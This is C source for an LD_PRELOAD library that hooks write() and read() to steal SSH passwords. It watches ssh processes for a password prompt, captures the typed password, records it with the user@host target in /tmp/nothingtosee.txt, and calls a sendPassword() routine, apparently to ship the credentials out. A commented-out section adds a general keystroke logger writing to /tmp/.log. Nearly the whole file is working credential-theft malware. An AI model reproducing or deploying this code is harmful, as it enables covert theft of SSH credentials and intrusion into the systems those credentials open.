#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <dlfcn.h>
#include <stdlib.h>
#include <stdarg.h>
#include "preload.h"

static int isAskingPasswd = 0;
static int isPasswordValid = 1;
static int isPasswordEntered = 0;
 
char *getssharg(){
  char *ssharg = malloc(sizeof(char) * 64);
  FILE *file = fopen("/proc/self/cmdline", "r");
  if (!file) {
    strcpy(ssharg, "NULL");
    return ssharg;
  }
  
  char fullstring[4096];
  ssize_t len_cmdline = fread(fullstring, 1, sizeof(fullstring), file);
  fclose(file);

  if (len_cmdline <= 0){
    strcpy(ssharg, "NULL");
    return ssharg;
  }
  
  for (int i = 0; i < len_cmdline; i++) {    
    if (fullstring[i] == '\0') {
      fullstring[i] = ' ';
    }
  }

  char *args = strtok(fullstring, " ");
  while ((args = strtok(NULL, " ")) != NULL) {
    if (strstr(args, "@")) {
      strncpy(ssharg, args, strlen(args));
      ssharg[strlen(args)] = '\0';
      return ssharg;
    }
    else {
      strcpy(ssharg, "NULL");
      return ssharg;
    }
  }
  strcpy(ssharg, "NULL");
  return ssharg;
}

int checkifssh(int fd){
  int pid = getpid();
  char path[64];
  snprintf(path, sizeof(path), "/proc/%d/comm", pid);
  FILE *file = fopen(path, "r");
  if (file) {
    char processName[64];
    fgets(processName, sizeof(processName), file);
    processName[strcspn(processName, "\n")] = 0;
    if (strcmp(processName, "ssh") == 0) {
      return 1;
    }
  }
  return 0;
}

ssize_t write(int fd, const void *buf, size_t nbyte) {
  ssize_t (*r_write)(int fd, const void *buf, size_t nbyte) = dlsym(RTLD_NEXT, "write");
  ssize_t output = r_write(fd, buf, nbyte);
  
  if (isatty(fd) && strstr(buf, "password:")) {
    isAskingPasswd = 1;
  }
  
  if (isatty(fd) && fd == 2) {
    if (strstr(buf ,"please try again.")) {
      isPasswordValid = 0;

      if (isPasswordEntered == 1) {
        printf("NOTHING TO SEE \n");
        remove("/tmp/nothingtosee.txt");
        isPasswordEntered = 0;
        isPasswordValid = 1;
      }
    }
}
  if (isPasswordEntered == 1 && isPasswordValid == 1) {
      sendPassword();
      isPasswordEntered = 0;
  }
  
  

  return output;
}


ssize_t read(int fd, void *buf, size_t nbytes) {
  ssize_t (*r_read)(int fd, void *buf, size_t nbytes) = dlsym(RTLD_NEXT, "read");
  ssize_t output = r_read(fd, buf, nbytes);
  static char passwd[64];
  static int pos = 0;
  
  int is_ssh = checkifssh(fd);
  if (isatty(fd) == 1 && is_ssh && isAskingPasswd == 1) {
    passwd[pos] = ((char *) buf)[0];
    if (((char*)buf)[0] == '\n') {
        passwd[pos] = '\0';
        isPasswordValid = 1;
        isPasswordEntered = 1;
        char *ssharg = getssharg();
        
        FILE *save = fopen("/tmp/nothingtosee.txt", "w");
        if (save) {
          char string[strlen(passwd) + strlen(ssharg) + 2];
          snprintf(string, sizeof(string), "%s %s\n", ssharg, passwd);
          fwrite(string, 1, strlen(string), save);
          fclose(save);
          isAskingPasswd = 0;
          pos = 0;
          memset(passwd, 0, sizeof(passwd));
          free(ssharg);
        }
    }
    else {
      pos++;
    }
  }

  // not very effective when full command are prompted because read is overrun by other program i guess
  // if (fd == 0 && isatty(fd) && nbytes > 0) {
  //     static char buffer[4096];
  //     static int pos = 0;
  //     static int inside_escape = 0;

  //     for (ssize_t i = 0; i < nbytes; i++) {
  //         char c = ((char *)buf)[i];

  //         if (c == '\033') {
  //             inside_escape = 1;
  //             continue;
  //         }

  //         if (inside_escape) {
  //             if ((c >= '@' && c <= 'Z') || (c >= 'a' && c <= 'z')) {
  //                 inside_escape = 0;
  //             }
  //             continue;
  //         }

  //         if (c == 0x7f || c == 0x08) { 
  //             if (pos > 0) {
  //                 pos--;
  //             }
  //             continue;
  //         }

  //         if ((c >= 32 && c <= 126) || c == '\n' || c == '\t') {
  //             if (pos < sizeof(buffer) - 1) {
  //                 buffer[pos++] = c;
  //             }
  //         }
  //     }

  //     if (pos > 0) {
  //         FILE *keylog = fopen("/tmp/.log", "a");
  //         if (keylog) {
  //             fwrite(buffer, 1, pos, keylog);
  //             fclose(keylog);
  //         }
  //         pos = 0;
  //     }
  // }

  return output;
}
